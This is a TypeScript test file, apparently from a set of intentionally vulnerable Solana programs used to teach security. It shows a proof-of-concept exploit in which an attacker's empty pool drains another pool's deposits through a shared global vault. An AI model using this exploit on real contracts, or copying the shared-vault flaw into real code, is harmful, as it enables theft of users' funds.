/**
 * VULN 04 — One global vault PDA shared by ALL pools.
 *
 * The vault token account is derived from the fixed seed [b"vault"], so
 * every pool ever created points to the same token store. Pool accounting
 * (pool.total) exists, but withdraw limits against the GLOBAL vault
 * balance instead of the caller's own pool share. A fresh pool created by
 * the attacker can therefore withdraw the deposits of another pool.
 */
import { assert } from "chai";
import {
  PROG_IDS, provider, anchorProgram, findPda, seedsBuf, airdrop, newFundedKeypair,
  createMint, createAccount, mintTo, tokenBalance, BN,
} from "./util";

describe("vuln04 shared vault PDA", () => {
  const program = anchorProgram("vuln04_pda_confusion", PROG_IDS.vuln04);
  const vaultPda = findPda([seedsBuf("vault")[0]], PROG_IDS.vuln04)[0];
  const poolPdaOf = (user: any) => findPda([seedsBuf("pool")[0], user.publicKey.toBytes()], PROG_IDS.vuln04)[0];

  let mint: any, victim: any, attacker: any;
  let victimAta: any, attackerAta: any, victimPool: any, attackerPool: any;

  before(async () => {
    await airdrop(provider.wallet.publicKey, 50);
    victim = await newFundedKeypair();
    attacker = await newFundedKeypair();

    mint = await createMint(provider.connection, provider.wallet.payer, provider.wallet.publicKey, null, 6);
    victimAta = await createAccount(provider.connection, provider.wallet.payer, mint, victim.publicKey);
    attackerAta = await createAccount(provider.connection, provider.wallet.payer, mint, attacker.publicKey);
    await mintTo(provider.connection, provider.wallet.payer, mint, victimAta, provider.wallet.publicKey, 1000);

    await program.methods.initialize().accounts({ mint }).rpc();

    // Victim pool deposits 1000 into the (global) vault.
    victimPool = poolPdaOf(victim);
    await program.methods.createPool().accounts({ authority: victim.publicKey, vault: vaultPda }).signers([victim]).rpc();
    await program.methods.deposit(new BN(1000))
      .accounts({ pool: victimPool, authority: victim.publicKey, userAta: victimAta, vault: vaultPda })
      .signers([victim])
      .rpc();

    // Attacker pool: same program, same global vault, own authority.
    attackerPool = poolPdaOf(attacker);
    await program.methods.createPool().accounts({ authority: attacker.publicKey, vault: vaultPda }).signers([attacker]).rpc();
  });

  it("attacker pool is empty but the shared vault holds 1000", async () => {
    const pool = await program.account.pool.fetch(attackerPool);
    assert.equal(pool.total.toString(), "0");
    assert.equal((await tokenBalance(vaultPda)).toString(), "1000");
  });

  it("attacker withdraws another pool's deposits", async () => {
    // BUG: the limit is vault.amount (global) instead of pool.total (0).
    await program.methods.withdraw(new BN(1000))
      .accounts({
        pool: attackerPool,
        authority: attacker.publicKey,
        destinationAta: attackerAta,
        vault: vaultPda,
      })
      .signers([attacker])
      .rpc();

    assert.equal((await tokenBalance(attackerAta)).toString(), "1000");
    assert.equal((await tokenBalance(vaultPda)).toString(), "0");
  });
});
